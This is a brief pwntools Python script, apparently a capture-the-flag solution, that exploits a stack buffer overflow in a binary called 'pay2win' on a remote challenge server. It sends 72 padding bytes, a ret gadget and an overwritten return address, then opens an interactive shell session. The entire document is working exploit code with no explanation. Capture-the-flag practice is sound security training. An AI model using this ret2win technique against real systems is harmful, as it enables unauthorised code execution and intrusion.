from pwn import *

# p = process("./pay2win")
# gdb.attach(p)

p = remote("pwn.toys", 30001)

ret = 0x40101a

payload = b"A"*72 + p64(ret) + p64(0x4012da)

p.recvuntil(b"pay >")
p.sendline(payload)
p.interactive()